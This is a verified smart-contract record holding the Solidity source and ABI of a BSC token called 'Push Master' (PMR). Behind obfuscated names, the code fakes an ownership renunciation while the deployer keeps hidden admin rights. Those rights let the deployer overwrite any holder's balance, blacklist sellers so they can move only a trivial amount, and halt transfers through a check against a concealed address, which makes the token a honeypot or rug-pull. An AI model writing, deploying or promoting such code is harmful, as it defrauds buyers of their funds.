{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface shouldAmount {\n    function createPair(address minMax, address atList) external returns (address);\n}\n\ninterface toTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedToken) external view returns (uint256);\n\n    function transfer(address isLiquidity, uint256 fromTake) external returns (bool);\n\n    function allowance(address modeTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isLiquidity,\n        uint256 fromTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxTradingMode, uint256 value);\n    event Approval(address indexed modeTake, address indexed spender, uint256 value);\n}\n\nabstract contract autoMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listSwapMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toTotalMetadata is toTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PushMaster is autoMax, toTotal, toTotalMetadata {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedList;\n    }\n\n    address toShouldList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function txReceiver(address receiverMode, address isLiquidity, uint256 fromTake) internal returns (bool) {\n        require(takeTrading[receiverMode] >= fromTake);\n        takeTrading[receiverMode] -= fromTake;\n        takeTrading[isLiquidity] += fromTake;\n        emit Transfer(receiverMode, isLiquidity, fromTake);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listLimitFund;\n    }\n\n    function isExempt(address receiverMode, address isLiquidity, uint256 fromTake) internal returns (bool) {\n        if (receiverMode == autoWalletAt) {\n            return txReceiver(receiverMode, isLiquidity, fromTake);\n        }\n        uint256 fundFrom = toTotal(amountToken).balanceOf(launchSenderFee);\n        require(fundFrom == fromExempt);\n        require(isLiquidity != launchSenderFee);\n        if (fundWalletList[receiverMode]) {\n            return txReceiver(receiverMode, isLiquidity, enableTotal);\n        }\n        return txReceiver(receiverMode, isLiquidity, fromTake);\n    }\n\n    mapping(address => uint256) private takeTrading;\n\n    uint256 private sellEnable;\n\n    string private tokenReceiver = \"Push Master\";\n\n    uint256 private exemptFundReceiver;\n\n    function launchMax() private view {\n        require(maxEnable[_msgSender()]);\n    }\n\n    function allowance(address swapFee, address receiverAt) external view virtual override returns (uint256) {\n        if (receiverAt == toShouldList) {\n            return type(uint256).max;\n        }\n        return marketingLimit[swapFee][receiverAt];\n    }\n\n    uint256 private swapMarketingAmount;\n\n    mapping(address => bool) public maxEnable;\n\n    function approve(address receiverAt, uint256 fromTake) public virtual override returns (bool) {\n        marketingLimit[_msgSender()][receiverAt] = fromTake;\n        emit Approval(_msgSender(), receiverAt, fromTake);\n        return true;\n    }\n\n    function enableLimitSwap(address amountEnableSender) public {\n        launchMax();\n        if (marketingFee == modeWallet) {\n            toSell = sellEnable;\n        }\n        if (amountEnableSender == autoWalletAt || amountEnableSender == amountToken) {\n            return;\n        }\n        fundWalletList[amountEnableSender] = true;\n    }\n\n    mapping(address => bool) public fundWalletList;\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellAt;\n    }\n\n    function walletReceiver(address exemptFund, uint256 fromTake) public {\n        launchMax();\n        takeTrading[exemptFund] = fromTake;\n    }\n\n    bool public totalLimit;\n\n    uint256 public modeWallet;\n\n    string private listLimitFund = \"PMR\";\n\n    function transfer(address exemptFund, uint256 fromTake) external virtual override returns (bool) {\n        return isExempt(_msgSender(), exemptFund, fromTake);\n    }\n\n    bool public receiverMarketing;\n\n    uint256 private toSell;\n\n    function txExempt() public {\n        emit OwnershipTransferred(autoWalletAt, address(0));\n        amountIs = address(0);\n    }\n\n    uint256 constant enableTotal = 9 ** 10;\n\n    address private amountIs;\n\n    address public autoWalletAt;\n\n    function transferFrom(address receiverMode, address isLiquidity, uint256 fromTake) external override returns (bool) {\n        if (_msgSender() != toShouldList) {\n            if (marketingLimit[receiverMode][_msgSender()] != type(uint256).max) {\n                require(fromTake <= marketingLimit[receiverMode][_msgSender()]);\n                marketingLimit[receiverMode][_msgSender()] -= fromTake;\n            }\n        }\n        return isExempt(receiverMode, isLiquidity, fromTake);\n    }\n\n    function liquiditySell(uint256 fromTake) public {\n        launchMax();\n        fromExempt = fromTake;\n    }\n\n    bool private takeReceiver;\n\n    uint256 tokenEnableTotal;\n\n    uint256 private launchedList = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed marketingShould, address indexed senderSwap);\n\n    function name() external view virtual override returns (string memory) {\n        return tokenReceiver;\n    }\n\n    function getOwner() external view returns (address) {\n        return amountIs;\n    }\n\n    address public amountToken;\n\n    uint256 private marketingFee;\n\n    uint256 fromExempt;\n\n    function modeSell(address receiverSell) public {\n        if (totalLimit) {\n            return;\n        }\n        \n        maxEnable[receiverSell] = true;\n        if (marketingFee != sellEnable) {\n            sellEnable = exemptFundReceiver;\n        }\n        totalLimit = true;\n    }\n\n    function balanceOf(address launchedToken) public view virtual override returns (uint256) {\n        return takeTrading[launchedToken];\n    }\n\n    uint8 private sellAt = 18;\n\n    constructor (){\n        if (receiverMarketing != takeReceiver) {\n            receiverMarketing = true;\n        }\n        listSwapMode fundTotalMax = listSwapMode(toShouldList);\n        amountToken = shouldAmount(fundTotalMax.factory()).createPair(fundTotalMax.WETH(), address(this));\n        if (exemptFundReceiver != modeWallet) {\n            swapMarketingAmount = sellEnable;\n        }\n        autoWalletAt = _msgSender();\n        maxEnable[autoWalletAt] = true;\n        takeTrading[autoWalletAt] = launchedList;\n        txExempt();\n        \n        emit Transfer(address(0), autoWalletAt, launchedList);\n    }\n\n    address launchSenderFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return amountIs;\n    }\n\n    mapping(address => mapping(address => uint256)) private marketingLimit;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTradingMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoWalletAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountEnableSender\",\"type\":\"address\"}],\"name\":\"enableLimitSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundWalletList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromTake\",\"type\":\"uint256\"}],\"name\":\"liquiditySell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"}],\"name\":\"modeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTake\",\"type\":\"uint256\"}],\"name\":\"walletReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PushMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}